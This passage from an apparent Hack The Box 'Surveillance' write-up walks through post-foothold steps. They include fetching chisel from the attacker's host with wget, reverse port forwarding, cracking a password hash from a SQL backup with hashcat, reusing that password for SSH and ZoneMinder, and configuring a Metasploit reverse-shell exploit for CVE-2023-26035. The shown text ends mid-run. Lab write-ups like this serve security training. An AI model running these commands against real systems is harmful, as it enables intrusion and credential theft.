+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@surveillance:/tmp$ netstat -ntlp
+</span></span><span class="line"><span class="cl">Active Internet connections (only servers)
+</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1105/nginx: worker  
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      1105/nginx: worker  
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::22                   :::*                    LISTEN      -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="examining-zoneminder-internal-webserver">Examining ZoneMinder internal webserver</h3>
+<p>A quick curl check shows this is a web server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@surveillance:/tmp$ curl localhost:8080
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html lang=&#34;en&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">  &lt;meta charset=&#34;utf-8&#34;&gt;
+</span></span><span class="line"><span class="cl">  &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&gt;
+</span></span><span class="line"><span class="cl">  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+</span></span><span class="line"><span class="cl">  &lt;title&gt;ZM - Login&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can pivot to view this using <code>chisel</code>. First, downloading chisel from my kali host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@surveillance:/tmp/ch$ wget 10.10.14.102/chisel
+</span></span><span class="line"><span class="cl">--2024-05-01 02:20:18--  http://10.10.14.102/chisel
+</span></span><span class="line"><span class="cl">Connecting to 10.10.14.102:80... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... 200 OK
+</span></span><span class="line"><span class="cl">Length: 8654848 (8.3M) [application/octet-stream]
+</span></span><span class="line"><span class="cl">Saving to: &#39;chisel&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chisel              100%[===================&gt;]   8.25M  6.81MB/s    in 1.2s    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2024-05-01 02:20:19 (6.81 MB/s) - &#39;chisel&#39; saved [8654848/8654848]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@surveillance:/tmp/ch$ chmod +x chisel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then on kali&rsquo;s chisel, establish reverse server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ./chisel server -p <span class="m">8000</span> --reverse
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now on the victim box, establish the port forwarding:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./chisel client 10.10.14.102:8000 R:8080:127.0.0.1:8080
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now when we visit localhost:8080, we are able to view the internal web port:</p>
+<p><img src="/post/hackthebox-surveillance/Images/zmlogin.png"
+	width="1226"
+	height="534"
+	srcset="/post/hackthebox-surveillance/Images/zmlogin_hu84d055fc8551844c24efd282272d561e_19812_480x0_resize_box_3.png 480w, /post/hackthebox-surveillance/Images/zmlogin_hu84d055fc8551844c24efd282272d561e_19812_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="229"
+		data-flex-basis="551px"
+	
+></p>
+<p>Researching ZoneMinder, we can find multiple potential CVEs: <a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-26037"  target="_blank" rel="noopener"
+    >CVE-2023-26037</a>, <a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-26039"  target="_blank" rel="noopener"
+    >CVE-2023-26039</a>, and <a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-26035"  target="_blank" rel="noopener"
+    >CVE-2023-26035</a>. However, some of these require authentication while the other straight up wasn&rsquo;t working well for me.</p>
+<h3 id="finding-more-hashes-in-a-backup-file">Finding more hashes in a backup file</h3>
+<p>Back to enumeration, I eventually find an interesting backup file in <code>/var/www/html/craft/storage/backups</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@surveillance:~/html/craft/storage/backups$ ls -al
+</span></span><span class="line"><span class="cl">total 28
+</span></span><span class="line"><span class="cl">drwxrwxr-x 2 www-data www-data  4096 Oct 17 20:33 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 6 www-data www-data  4096 Oct 11 20:12 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root     root     19918 Oct 17 20:33 surveillance--2023-10-17-202801--v4.4.14.sql.zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After extracting, we can see this is plaintext:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Surveillance]
+</span></span><span class="line"><span class="cl">└─$ file surveillance--2023-10-17-202801--v4.4.14.sql
+</span></span><span class="line"><span class="cl">surveillance--2023-10-17-202801--v4.4.14.sql: ASCII text
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In here there is data insert for <code>users</code> table:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">LOCK</span><span class="w"> </span><span class="kp">TABLES</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="k">WRITE</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/*!40000 ALTER TABLE `users` DISABLE KEYS */</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">set</span><span class="w"> </span><span class="n">autocommit</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="no">NULL</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;Matthew B&#39;</span><span class="p">,</span><span class="s1">&#39;Matthew&#39;</span><span class="p">,</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="s1">&#39;admin@surveillance.htb&#39;</span><span class="p">,</span><span class="s1">&#39;39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec&#39;</span><span class="p">,</span><span class="s1">&#39;2023-10-17 20:22:34&#39;</span><span class="p">,</span><span class="no">NULL</span><span class="p">,</span><span class="no">NULL</span><span class="p">,</span><span class="no">NULL</span><span class="p">,</span><span class="s1">&#39;2023-10-11 18:58:57&#39;</span><span class="p">,</span><span class="no">NULL</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="no">NULL</span><span class="p">,</span><span class="no">NULL</span><span class="p">,</span><span class="no">NULL</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;2023-10-17 20:27:46&#39;</span><span class="p">,</span><span class="s1">&#39;2023-10-11 17:57:16&#39;</span><span class="p">,</span><span class="s1">&#39;2023-10-17 20:27:46&#39;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/*!40000 ALTER TABLE `users` ENABLE KEYS */</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">UNLOCK</span><span class="w"> </span><span class="kp">TABLES</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">commit</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is a new hash for matthew, looking like an easier hash to crack:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Surveillance]
+</span></span><span class="line"><span class="cl">└─$ hashid &#39;39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec&#39;                                                       
+</span></span><span class="line"><span class="cl">Analyzing &#39;39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec&#39;
+</span></span><span class="line"><span class="cl">[+] Snefru-256 
+</span></span><span class="line"><span class="cl">[+] SHA-256 
+</span></span><span class="line"><span class="cl">[+] RIPEMD-256 
+</span></span><span class="line"><span class="cl">[+] Haval-256 
+</span></span><span class="line"><span class="cl">[+] GOST R 34.11-94 
+</span></span><span class="line"><span class="cl">[+] GOST CryptoPro S-Box 
+</span></span><span class="line"><span class="cl">[+] SHA3-256 
+</span></span><span class="line"><span class="cl">[+] Skein-256 
+</span></span><span class="line"><span class="cl">[+] Skein-512(256) 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using hashcat, it cracks instantly:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ hashcat -m 1400 &#39;39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec&#39; /usr/share/wordlists/rockyou.txt 
+</span></span><span class="line"><span class="cl">hashcat (v6.2.5) starting
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Successfully initialized NVIDIA CUDA library.
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
+</span></span><span class="line"><span class="cl">                                                          
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Mode........: 1400 (SHA2-256)
+</span></span><span class="line"><span class="cl">Hash.Target......: 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c...5770ec
+</span></span><span class="line"><span class="cl">Time.Started.....: Sun Dec 10 12:08:06 2023 (0 secs)
+</span></span><span class="line"><span class="cl">Time.Estimated...: Sun Dec 10 12:08:06 2023 (0 secs)
+</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
+</span></span><span class="line"><span class="cl">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 (100.00%)
+</span></span><span class="line"><span class="cl">Speed.#1.........: 12754.9 kH/s (2.78ms) @ Accel:512 Loops:1 Thr:64 Vec:1
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 (100.00%) Digests
+</span></span><span class="line"><span class="cl">Progress.........: 3833856/14344384 (26.73%)
+</span></span><span class="line"><span class="cl">Rejected.........: 0/3833856 (0.00%)
+</span></span><span class="line"><span class="cl">Restore.Point....: 3407872/14344384 (23.76%)
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
+</span></span><span class="line"><span class="cl">Candidates.#1....: tabbal -&gt; shardaashok
+</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 58c Fan: 31% Util: 25% Core:1316MHz Mem:3505MHz Bus:16
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Started: Sun Dec 10 12:08:05 2023
+</span></span><span class="line"><span class="cl">Stopped: Sun Dec 10 12:08:07 2023
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>matthew:starcraft122490</code>
+Note that this <strong>is</strong> the same password used in zoneminder, but it&rsquo;s much longer to crack from a large wordlist like rockyou:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ hashcat -m 3200 &#39;$2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd.&#39; ./test 
+</span></span><span class="line"><span class="cl">hashcat (v6.2.5) starting
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Successfully initialized NVIDIA CUDA library.
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd.:starcraft122490
+</span></span><span class="line"><span class="cl">                                                          
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+</span></span><span class="line"><span class="cl">Hash.Target......: $2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2...6dxYd.
+</span></span><span class="line"><span class="cl">Time.Started.....: Sun Dec 10 12:09:05 2023 (1 sec)
+</span></span><span class="line"><span class="cl">Time.Estimated...: Sun Dec 10 12:09:06 2023 (0 secs)
+</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
+</span></span><span class="line"><span class="cl">Guess.Base.......: File (./test)
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 (100.00%)
+</span></span><span class="line"><span class="cl">Speed.#1.........:        1 H/s (6.83ms) @ Accel:16 Loops:8 Thr:11 Vec:1
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 (100.00%) Digests
+</span></span><span class="line"><span class="cl">Progress.........: 1/1 (100.00%)
+</span></span><span class="line"><span class="cl">Rejected.........: 0/1 (0.00%)
+</span></span><span class="line"><span class="cl">Restore.Point....: 0/1 (0.00%)
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
+</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
+</span></span><span class="line"><span class="cl">Candidates.#1....: starcraft122490 -&gt; starcraft122490
+</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 60c Fan: 29% Util:100% Core:1316MHz Mem:3505MHz Bus:16
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Started: Sun Dec 10 12:09:05 2023
+</span></span><span class="line"><span class="cl">Stopped: Sun Dec 10 12:09:07 2023
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The login credentials work for user matthew:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Surveillance]
+</span></span><span class="line"><span class="cl">└─$ ssh matthew@surveillance.htb    
+</span></span><span class="line"><span class="cl">The authenticity of host &#39;surveillance.htb (10.129.171.36)&#39; can&#39;t be established.
+</span></span><span class="line"><span class="cl">ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
+</span></span><span class="line"><span class="cl">This host key is known by the following other names/addresses:
+</span></span><span class="line"><span class="cl">    ~/.ssh/known_hosts:61: [hashed name]
+</span></span><span class="line"><span class="cl">    ~/.ssh/known_hosts:64: [hashed name]
+</span></span><span class="line"><span class="cl">    ~/.ssh/known_hosts:65: [hashed name]
+</span></span><span class="line"><span class="cl">    ~/.ssh/known_hosts:66: [hashed name]
+</span></span><span class="line"><span class="cl">    ~/.ssh/known_hosts:88: [hashed name]
+</span></span><span class="line"><span class="cl">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span class="line"><span class="cl">Warning: Permanently added &#39;surveillance.htb&#39; (ED25519) to the list of known hosts.
+</span></span><span class="line"><span class="cl">matthew@surveillance.htb&#39;s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">Last login: Tue Dec  5 12:43:54 2023 from 10.10.14.40
+</span></span><span class="line"><span class="cl">matthew@surveillance:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="returning-to-zoneminder-with-valid-credentials">Returning to ZoneMinder with valid credentials</h3>
+<p>Checking <code>sudo</code> privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">matthew@surveillance:~$ sudo -l
+</span></span><span class="line"><span class="cl">[sudo] password for matthew: 
+</span></span><span class="line"><span class="cl">Sorry, user matthew may not run sudo on surveillance.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can also enter zoneminder now by recycling the password:</p>
+<p><img src="/post/hackthebox-surveillance/Images/zmentry.png"
+	width="1043"
+	height="422"
+	srcset="/post/hackthebox-surveillance/Images/zmentry_hub21aa3036082cec8331679690d67fb32_46750_480x0_resize_box_3.png 480w, /post/hackthebox-surveillance/Images/zmentry_hub21aa3036082cec8331679690d67fb32_46750_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="593px"
+	
+></p>
+<p><code>admin:starcraft122490</code></p>
+<p>Returning to the CVEs previously researched, we can apply a <a class="link" href="https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_snapshots/"  target="_blank" rel="noopener"
+    >metasploit module</a> for CVE-2023-26035:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">zoneminder_snapshots</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">RHOSTS</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">RHOSTS</span> <span class="o">=&gt;</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">zoneminder_snapshots</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">RPORT</span> <span class="mi">8080</span>
+</span></span><span class="line"><span class="cl"><span class="n">RPORT</span> <span class="o">=&gt;</span> <span class="mi">8080</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">zoneminder_snapshots</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">TARGETURI</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">TARGETURI</span> <span class="o">=&gt;</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">zoneminder_snapshots</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">SRVPORT</span> <span class="mi">8001</span>
+</span></span><span class="line"><span class="cl"><span class="n">SRVPORT</span> <span class="o">=&gt;</span> <span class="mi">8001</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">zoneminder_snapshots</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">FETCH_SRVPORT</span> <span class="mi">8001</span>
+</span></span><span class="line"><span class="cl"><span class="n">FETCH_SRVPORT</span> <span class="o">=&gt;</span> <span class="mi">8001</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">zoneminder_snapshots</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">LHOST</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.134</span>
+</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.134</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">zoneminder_snapshots</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">reverse</span> <span class="n">TCP</span> <span class="n">handler</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.134</span><span class="p">:</span><span class="mi">4444</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Running</span> <span class="n">automatic</span> <span class="n">check</span> <span class="p">(</span><span class="s2">&#34;set AutoCheck false&#34;</span> <span class="n">to</span> <span class="n">disable</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Elapsed</span> <span class="n">time</span><span class="p">:</span> <span class="mf">12.486233060000814</span> <span class="n">seconds</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">The</span> <span class="n">target</span> <span class="n">is</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Fetching</span> <span class="n">CSRF</span> <span class="n">Token</span>
